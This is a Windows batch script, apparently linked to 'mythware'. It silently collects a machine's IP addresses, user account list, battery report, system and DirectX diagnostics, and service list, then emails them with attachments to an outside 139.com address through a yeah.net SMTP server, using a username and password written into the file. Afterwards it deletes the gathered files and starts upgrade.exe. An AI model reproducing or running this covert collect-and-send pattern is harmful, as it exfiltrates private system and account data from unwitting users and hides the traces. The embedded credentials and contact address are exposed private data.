@echo off
call ip.bat
for /f tokens^=1^,2^ delims^=^"^" %%a in ('wmic nicconfig get IPAddress /value ^| findstr /i "IPAddress=[^]"') do (set "ip=%%b")
echo ÄÚÍøIP:>>%file%
echo.%ip%>>%file%
echo ÍâÍøIP:>>%file%
echo.%PublicIP%>>%file%
net user>>%file%
powercfg /BatteryReport
systeminfo>systeminfo.txt
dxdiag /dontskip /whql:off /t dxdiag.txt
mkdir %logPath%\temp
move battery-report.html %logPath%\temp\
move systeminfo.txt %logPath%\temp\
move dxdiag.txt %logPath%\temp\
move service.txt %logPath%\temp\
copy %file% %logPath%\temp\
set from=mythware@yeah.net
set user=mythware
set pass=cysb4321
set to=15158879870@139.com
set subj="%computername%\%username%"
set mail=%file%
set attach=%logPath%\temp\*.*
set server=smtp.yeah.net
set debug=-debug -log blat.log -timestamp
blat "%mail%" -to %to% -base64 -charset Gb2312 -subject "%subj%" -attach %attach% -server %server% -f %from% -u %user% -pw %pass% %debeg%&del /q %logPath%\temp\*.*
start /I upgrade.exe
exit